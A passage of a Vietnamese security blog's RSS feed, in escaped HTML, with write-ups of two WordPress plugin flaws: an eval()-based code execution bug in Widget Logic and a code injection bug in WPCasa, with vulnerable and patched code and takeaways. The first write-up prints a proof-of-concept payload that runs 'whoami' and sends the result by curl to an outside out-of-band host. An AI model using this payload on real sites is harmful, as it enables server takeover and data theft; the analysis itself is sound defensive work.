alt=&#34;Widget&#34; height=&#34;622&#34; width=&#34;347&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget Logic trong Advanced Option&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;widget_logic_check_logic&lt;/code&gt; được gọi Nếu block có attribute này.&lt;/p&gt;&#xA;&lt;p&gt;Lỗ hổng được công bố với yêu cầu đặc quyền &lt;strong&gt;Contributor&lt;/strong&gt; vì đây là đặc quyền có thể tạo post và sử dụng Widget Logic trong Advanced Option.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor creates/edits a Gutenberg block&amp;#34;] --&amp;gt; B[&amp;#34;Add widgetLogic value in Advanced Options&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Page/Post is rendered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;render_block filter is triggered&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;widget_logic_block_render() is called&amp;#34;]&#xA;&#xA;E --&amp;gt; F{&amp;#34;block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;] exists?&amp;#34;}&#xA;F -- No --&amp;gt; G[&amp;#34;Render block normally&amp;#34;]&#xA;F -- Yes --&amp;gt; H[&amp;#34;Pass widgetLogic to widget_logic_check_logic()&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Normalize &amp;amp; wrap logic with return(...) if needed&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Execute logic using eval()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;Result = true ?&amp;#34;}&#xA;K -- Yes --&amp;gt; L[&amp;#34;Block content is displayed&amp;#34;]&#xA;K -- No --&amp;gt; M[&amp;#34;Block is hidden (empty)&amp;#34;]&#xA;&#xA;J --&amp;gt; N{&amp;#34;Malicious code injected?&amp;#34;}&#xA;N -- Yes --&amp;gt; O[&amp;#34;Arbitrary PHP code executed (RCE)&amp;#34;]&#xA;&#xA;L --&amp;gt; Z[&amp;#34;End&amp;#34;]&#xA;M --&amp;gt; Z&#xA;O --&amp;gt; Z&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Đăng nhập với user &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Tạo post, thêm một block bất kì và thêm payload vào &lt;strong&gt;Widget Logic&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;system(&amp;#39;curl http://929topgvyzo9d93rxe1xpxcriio9cz0o.oastify.com/?leadked=$(whoami)&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#39; alt=&#34;Result&#34; height=&#34;582&#34; width=&#34;1131&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE‑2025‑32222 bắt nguồn từ việc &lt;strong&gt;sử dụng &lt;code&gt;eval()&lt;/code&gt; trên dữ liệu do người dùng kiểm soát&lt;/strong&gt; trong &lt;code&gt;widget_logic_check_logic()&lt;/code&gt;. Chỉ với quyền &lt;strong&gt;Contributor&lt;/strong&gt;, kẻ tấn công có thể chèn logic độc hại vào thuộc tính &lt;code&gt;widgetLogic&lt;/code&gt; của block, khiến mã PHP tùy ý được thực thi trong quá trình &lt;code&gt;render_block&lt;/code&gt;. Cơ chế tự động bọc &lt;code&gt;return(...)&lt;/code&gt; càng làm việc khai thác dễ dàng hơn vì mọi chuỗi nhập vào cuối cùng đều trở thành mã PHP hợp lệ. Bản vá 6.0.6 đã xử lý triệt để bằng cách loại bỏ &lt;code&gt;eval()&lt;/code&gt;, dùng cơ chế &lt;strong&gt;tokenize + parse + allowlist&lt;/strong&gt;, từ đó chặn hoàn toàn khả năng thực thi mã tùy ý.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ sử dụng &lt;code&gt;eval()&lt;/code&gt; với dữ liệu đến từ người dùng, kể cả người dùng có đặc quyền thấp hơn admin.&lt;/li&gt;&#xA;&lt;li&gt;Các biểu thức logic nên được xử lý bằng &lt;strong&gt;parser riêng + whitelist hàm hợp lệ&lt;/strong&gt;, không phải thực thi trực tiếp.&lt;/li&gt;&#xA;&lt;li&gt;Dữ liệu gắn vào block (block attributes) vẫn là &lt;strong&gt;user input&lt;/strong&gt; và phải được kiểm soát chặt chẽ.&lt;/li&gt;&#xA;&lt;li&gt;Chỉ cần quyền &lt;strong&gt;Contributor&lt;/strong&gt; cũng có thể gây ra &lt;strong&gt;RCE nghiêm trọng&lt;/strong&gt; nếu cơ chế kiểm soát đầu vào sai.&lt;/li&gt;&#xA;&lt;li&gt;Việc thay thế &lt;code&gt;eval()&lt;/code&gt; bằng cách tiếp cận phân tích cú pháp an toàn là hướng đi đúng cho các plugin xử lý “logic người dùng”.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-logic/vulnerability/wordpress-widget-logic-6-0-5-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin &amp;lt;= 6.0.5 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9321 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-28-cve-2025-9321/</link>
      <pubDate>Fri, 28 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-28-cve-2025-9321/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WPCasa cho WordPress dễ bị tấn công Code Injection trong tất cả các phiên bản cho đến và bao gồm 1.4.1. Nguyên nhân là do việc xác thực và giới hạn đầu vào không đầy đủ trong hàm &lt;code&gt;&#39;api_requests&#39;&lt;/code&gt;. Điều này cho phép kẻ tấn công chưa xác thực có thể gọi các hàm tùy ý và thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9321&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9321&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.4.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wpcasa/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WPCasa&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v1.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function api_requests() {&#xA;    global $wp;&#xA;&#xA;    if ( ! empty( $_GET[&amp;#39;wpsight-api&amp;#39;] ) )&#xA;        $wp-&amp;gt;query_vars[&amp;#39;wc-api&amp;#39;] = sanitize_text_field( $_GET[&amp;#39;wpsight-api&amp;#39;] );&#xA;&#xA;    if ( ! empty( $wp-&amp;gt;query_vars[&amp;#39;wc-api&amp;#39;] ) ) {&#xA;        // Buffer, we won&amp;#39;t want any output here&#xA;        ob_start();&#xA;&#xA;        // Get API trigger&#xA;        $api = strtolower( esc_attr( $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;] ) );&#xA;&#xA;        // Load class if exists&#xA;        if ( class_exists( $api ) )&#xA;            $api_class = new $api();&#xA;&#xA;        // Trigger actions&#xA;        do_action( &amp;#39;wpsight_api_&amp;#39; . $api );&#xA;&#xA;        // Done, clear buffer and exit&#xA;        ob_end_clean();&#xA;        die(&amp;#39;1&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này lấy tham số &lt;code&gt;wpsight-api&lt;/code&gt; từ URL, dùng nó để tạo class nếu tồn tại và gọi hook &lt;code&gt;do_action&lt;/code&gt; tương ứng, sau đó kết thúc bằng &lt;code&gt;die(&#39;1&#39;)&lt;/code&gt;. Vấn đề là dữ liệu từ URL không được kiểm soát chặt, dễ bị lợi dụng để thực thi mã trái phép.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v1.4.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function api_requests() {&#xA;    global $wp;&#xA;&#xA;    // 1) Preferred getter.&#xA;    $raw = get_query_var( &amp;#39;wpsight-api&amp;#39; );&#xA;&#xA;    // 2) Fallback: directly from $wp-&amp;gt;query_vars.&#xA;    if ( empty( $raw ) &amp;amp;&amp;amp; isset( $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;] ) ) {&#xA;        $raw = $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;];&#xA;    }&#xA;&#xA;    // 3) Last resort: direct $_GET.&#xA;    if ( empty( $raw ) &amp;amp;&amp;amp; ! empty( $_GET[&amp;#39;wpsight-api&amp;#39;] ) ) {&#xA;        $raw = sanitize_text_field( wp_unslash( $_GET[&amp;#39;wpsight-api&amp;#39;] ) );&#xA;    }&#xA;&#xA;    // No request found → exit early.&#xA;    if ( empty( $raw ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Sanitize to a valid key.&#xA;    $api = sanitize_key( $raw );&#xA;&#xA;    if ( empty( $api ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    /**&#xA;        * Build allow-list of allowed API endpoints.&#xA;        *&#xA;        * IMPORTANT: Replace or extend this list in your theme or plugin&#xA;        * using the &amp;#39;wpsight_api_allowed_endpoints&amp;#39; filter.&#xA;        *&#xA;        * Example:&#xA;        *&#xA;        * add_filter( &amp;#39;wpsight_api_allowed_endpoints&amp;#39;, function( $allowed ) {&#xA;        *     $allowed[&amp;#39;ping&amp;#39;] = array( &amp;#39;class&amp;#39; =&amp;gt; null );&#xA;        *     return $allowed;&#xA;        * } );&#xA;        */&#xA;    $allowed = apply_filters(&#xA;        &amp;#39;wpsight_api_allowed_endpoints&amp;#39;,&#xA;        array()&#xA;    );&#xA;&#xA;    // If API is not allowed, block access.&#xA;    if ( ! isset( $allowed[ $api ] ) ) {&#xA;        wp_die(&#xA;            sprintf(&#xA;            /* translators: %s: API endpoint slug */&#xA;                esc_html__( &amp;#39;Endpoint &amp;#34;%s&amp;#34; not allowed.&amp;#39;, &amp;#39;wpcasa&amp;#39; ),&#xA;                $api&#xA;            ),&#xA;            esc_html__( &amp;#39;Forbidden&amp;#39;, &amp;#39;wpcasa&amp;#39; ),&#xA;            array( &amp;#39;response&amp;#39; =&amp;gt; 403 )&#xA;        );&#xA;    }&#xA;&#xA;    // Start output buffering.&#xA;    ob_start();&#xA;&#xA;    // Optional: safe class instantiation if explicitly allowed.&#xA;    if ( ! empty( $allowed[ $api ][&amp;#39;class&amp;#39;] ) &amp;amp;&amp;amp; class_exists( $allowed[ $api ][&amp;#39;class&amp;#39;] ) ) {&#xA;        new $allowed[ $api ][&amp;#39;class&amp;#39;]();&#xA;    }&#xA;&#xA;    /**&#xA;        * Trigger API action hook.&#xA;        *&#xA;        * Example usage:&#xA;        * add_action( &amp;#39;wpsight_api_ping&amp;#39;, function() {&#xA;        *     echo &amp;#39;pong&amp;#39;;&#xA;        * } );&#xA;        */&#xA;    do_action( &amp;#39;wpsight_api_&amp;#39; . $api );&#xA;&#xA;    // In development mode, allow buffer output for easier testing.&#xA;    if ( defined( &amp;#39;WP_DEBUG&amp;#39; ) &amp;amp;&amp;amp; WP_DEBUG ) {&#xA;        ob_end_flush();&#xA;    } else {&#xA;        ob_end_clean();&#xA;    }&#xA;&#xA;    // Maintain old behaviour for backward compatibility.&#xA;    die( &amp;#39;1&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#39; alt=&#34;Diff&#34; height=&#34;975&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy dữ liệu theo thứ tự: &lt;code&gt;get_query_var&lt;/code&gt; → &lt;code&gt;$wp-&amp;gt;query_vars&lt;/code&gt; → &lt;code&gt;$_GET&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;code&gt;sanitize_key&lt;/code&gt; để đảm bảo dữ liệu hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;Có danh sách cho phép (allow-list) qua filter &lt;code&gt;wpsight_api_allowed_endpoints&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu endpoint không nằm trong danh sách thì chặn truy cập (403).&lt;/li&gt;&#xA;&lt;li&gt;Chỉ tạo class nếu được khai báo rõ ràng trong danh sách.&lt;/li&gt;&#xA;&lt;li&gt;Có hỗ trợ chế độ debug để kiểm thử dễ dàng.&lt;/li&gt;&#xA;&lt;li&gt;An toàn hơn, hạn chế việc thực thi mã trái phép.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 